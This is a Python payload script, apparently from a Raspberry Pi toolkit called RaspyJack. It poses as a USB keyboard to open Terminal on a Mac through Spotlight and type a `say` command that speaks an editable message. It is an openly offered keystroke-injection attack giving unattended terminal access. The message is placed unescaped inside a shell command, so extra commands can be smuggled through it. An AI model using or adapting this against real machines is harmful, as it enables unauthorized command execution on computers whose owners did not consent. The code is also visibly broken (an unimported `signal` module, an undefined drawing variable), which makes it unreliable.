#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Text-to-Speech (macOS)**
=============================================================
A fun social engineering payload that uses the built-in `say`
command on macOS to make the computer speak a message.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

from hid_helper import hid_helper # Import the new HID helper

# --- CONFIGURATION ---
MESSAGE_TO_SAY = "I am a rogue USB device." # Will be configurable

# --- GPIO & LCD ---
PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    FONT = ImageFont.load_default() # General purpose font
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT_TITLE = ImageFont.load_default() # Fallback to default font
    FONT = ImageFont.load_default() # Fallback to default font

# --- Globals & Shutdown ---
running = True
current_message_input = MESSAGE_TO_SAY # For message input
message_input_cursor_pos = 0

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def show_message(lines, color="lime"):
    if not HARDWARE_LIBS_AVAILABLE:
        for line in lines:
            print(line)
        return
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = FONT_TITLE # Use FONT_TITLE for messages
    y = 40
    for line in lines:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (128 - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(image, 0, 0)

def draw_ui(screen_state="main"):
    if not HARDWARE_LIBS_AVAILABLE:
        print(f"UI State: {screen_state}")
        if screen_state == "main":
            print(f"Message: {MESSAGE_TO_SAY}")
        return

    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "macOS Say", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)
    
    if screen_state == "main":
        d.text((5, 30), "Message:", font=FONT, fill="white")
        d.text((5, 45), MESSAGE_TO_SAY[:16] + "...", font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "OK=Start | KEY1=Edit Msg | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "message_input":
        d.text((5, 30), "Enter Message:", font=FONT, fill="white")
        display_message = list(current_message_input)
        if message_input_cursor_pos < len(display_message):
            display_message[message_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_message[:16]), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Char | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        d.text((5, 50), "Injecting Say...", font=FONT_TITLE, fill="yellow")
        d.text((5, 70), f"Msg: {MESSAGE_TO_SAY[:16]}...", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Stop", font=FONT, fill="cyan")
    elif screen_state == "success":
        d.text((5, 50), "Attack Sent!", font=FONT_TITLE, fill="lime")
        d.text((5, 70), "Check target.", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "failed":
        d.text((5, 50), "Attack FAILED!", font=FONT_TITLE, fill="red")
        d.text((5, 70), "Check console.", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "hid_error":
        d.text((5, 40), "HID Gadget NOT", font=FONT_TITLE, fill="red")
        d.text((5, 60), "enabled!", font=FONT_TITLE, fill="red")
        d.text((5, 80), "See update_deps.py", font=FONT, fill="white")
        d.text((5, 115), "KEY3=Exit", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_text_input_logic(initial_text, screen_state_name, char_set):
    global current_message_input, message_input_cursor_pos
    
    current_input_ref = current_message_input
    cursor_pos_ref = message_input_cursor_pos

    current_input_ref = initial_text
    cursor_pos_ref = len(initial_text) - 1
    
    draw_ui(screen_state_name)
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel input
            return None
        
        if btn == "OK": # Confirm input
            if current_input_ref: # Basic validation
                return current_input_ref
            else:
                show_message(["Input cannot", "be empty!"], "red")
                time.sleep(2)
                current_input_ref = initial_text
                cursor_pos_ref = len(initial_text) - 1
                draw_ui(screen_state_name)
        
        if btn == "LEFT":
            cursor_pos_ref = max(0, cursor_pos_ref - 1)
            draw_ui(screen_state_name)
        elif btn == "RIGHT":
            cursor_pos_ref = min(len(current_input_ref), cursor_pos_ref + 1)
            draw_ui(screen_state_name)
        elif btn == "UP" or btn == "DOWN":
            if cursor_pos_ref < len(current_input_ref):
                char_list = list(current_input_ref)
                current_char = char_list[cursor_pos_ref]
                
                try:
                    char_index = char_set.index(current_char)
                    if btn == "UP":
                        char_index = (char_index + 1) % len(char_set)
                    else: # DOWN
                        char_index = (char_index - 1 + len(char_set)) % len(char_set)
                    char_list[cursor_pos_ref] = char_set[char_index]
                    current_input_ref = "".join(char_list)
                except ValueError: # If current char is not in char_set
                    char_list[cursor_pos_ref] = char_set[0] # Default to first char
                    current_input_ref = "".join(char_list)
                draw_ui(screen_state_name)
        
        time.sleep(0.1)
    return None

# --- Main Attack Logic ---
def run_attack():
    global MESSAGE_TO_SAY
    
    draw_ui("attacking")
    
    if not hid_helper.is_hid_gadget_enabled:
        draw_ui("hid_error")
        time.sleep(4)
        return False

    cmd = f"say '{MESSAGE_TO_SAY}'"
    
    try:
        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.space) # Cmd+Space for Spotlight
        time.sleep(0.5)
        hid_helper.type_string("Terminal")
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.75)
        hid_helper.type_string(cmd)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(2)
        hid_helper.type_string("exit")
        hid_helper.press_key(hid_helper.keyboard.enter)
        
        draw_ui("success")
        return True
    except Exception as e:
        print(f"Error running HID attack: {e}", file=sys.stderr)
        draw_ui("failed")
        return False

# --- Execution ---
if __name__ == '__main__':
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries (RPi.GPIO, LCD drivers, PIL) are not available. Cannot run HID macOS Say.", file=sys.stderr)
        sys.exit(1)

    current_screen = "main"
    try:
        while running:
            if current_screen == "main":
                draw_ui("main")
                
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0:
                    if run_attack():
                        time.sleep(3) # Display success/failure
                    current_screen = "main"
                    time.sleep(0.3) # Debounce
                
                if GPIO.input(PINS["KEY1"]) == 0: # Edit Message
                    current_message_input = MESSAGE_TO_SAY
                    current_screen = "message_input"
                    time.sleep(0.3) # Debounce
            
            elif current_screen == "message_input":
                char_set = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>? " # Common message chars
                new_message = handle_text_input_logic(current_message_input, "message_input", char_set)
                if new_message:
                    MESSAGE_TO_SAY = new_message
                current_screen = "main"
                time.sleep(0.3) # Debounce
            
            time.sleep(0.1)
            
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        if HARDWARE_LIBS_AVAILABLE:
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID macOS Say payload finished.")
